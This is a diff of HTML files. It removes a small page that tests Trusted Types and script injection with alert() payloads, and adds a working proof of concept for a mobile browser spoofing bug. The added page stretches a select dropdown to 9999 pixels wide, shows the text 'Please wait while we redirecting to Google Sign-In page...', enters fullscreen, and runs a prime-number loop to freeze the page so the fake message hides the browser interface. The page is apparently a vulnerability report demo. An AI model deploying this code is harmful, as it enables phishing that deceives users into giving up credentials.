@@ -1,16 +1,57 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta http-equiv="Content-Security-Policy" content="require-trusted-types-for 'script'; trusted-types 'none';">
-</head>
-<body>
-  <div id="div" onclick="return false;">CLICK</div>
-  <script id="script" src="foo" type="invalid"></script>
-  <script>
-    div.attributes.onclick.nodeValue='alert(/div-onclick/)';
-    script.type="text/javascript";
-    script.attributes.src.nodeValue='data:,alert(/script-src/)';
-  </script>
-</body>
-</html>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        overflow-x: hidden;
+        overflow-y: hidden;
+    }
+
+    select {
+        margin-top: 10%;
+        height: 89%;
+        width: 9999px;
+    }
+</style>
+<script>
+    function calculatePrimes(iterations, multiplier) {
+        var primes = [];
+        for (var i = 0; i < iterations; i++) {
+            var candidate = i * (multiplier * Math.random());
+            var isPrime = true;
+            for (var c = 2; c <= Math.sqrt(candidate); ++c) {
+                if (candidate % c === 0) {
+                    // not prime
+                    isPrime = false;
+                    break;
+                }
+            }
+            if (isPrime) {
+                primes.push(candidate);
+            }
+        }
+        return primes;
+    }
+
+    function run() {
+        spoofText.selected = true
+
+        setTimeout(function() {
+            window.requestAnimationFrame(blocking);
+        })
+
+        document.documentElement.requestFullscreen()
+    }
+
+    function blocking() {
+        calculatePrimes(8000, 100000) // blocking JS to show select dropdown menu on fullscreen mode for ~6 seconds on Mi 9T (if your phone is faster, try to increase 8000 to higher value)
+        selectElement.remove()
+
+    }
+</script>
+<select id="selectElement" onmousedown="run()">
+    <option id="spoofText">Please wait while we redirecting to Google Sign-In page...</option>
+    <option></option>
+    <option></option>
+    <option selected>Tap Here</option>
+</select>
